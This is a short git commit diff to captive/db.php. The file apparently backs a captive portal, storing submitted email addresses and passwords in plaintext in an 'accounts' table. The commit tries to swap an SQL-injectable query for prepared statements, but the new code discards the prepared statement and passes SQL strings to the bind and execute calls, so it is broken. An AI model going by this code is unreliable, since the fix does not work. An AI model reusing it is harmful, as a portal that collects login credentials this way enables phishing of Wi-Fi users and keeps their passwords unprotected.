1ee2f7973e896b0fc25a30f74e99d3fc39cb3d40
Victor Fresco <47251535+hacefresko@users.noreply.github.com>
2022-09-22 21:40:59 +0200

    Update db.php

--- captive/db.php
+++ captive/db.php
@@ -11,8 +11,10 @@ $conn = mysqli_connect($host, $username, $pass, $dbname);// Check connection
 if ($conn) {
     $email=$_POST['email'];
     $password=$_POST['password'];
-    $sql = "INSERT INTO accounts (email, password) VALUES ('$email', '$password')";
-    mysqli_query($conn, $sql);
+    $sql_statement = "INSERT INTO accounts (email, password) VALUES (?, ?)";
+    mysqli_prepare($conn, $sql_statement);
+    mysqli_stmt_bind_param($sql_statement, "ss", $email, $password);
+    mysqli_stmt_execute($sql_statement);
     mysqli_close($conn);
 }
 sleep(1);
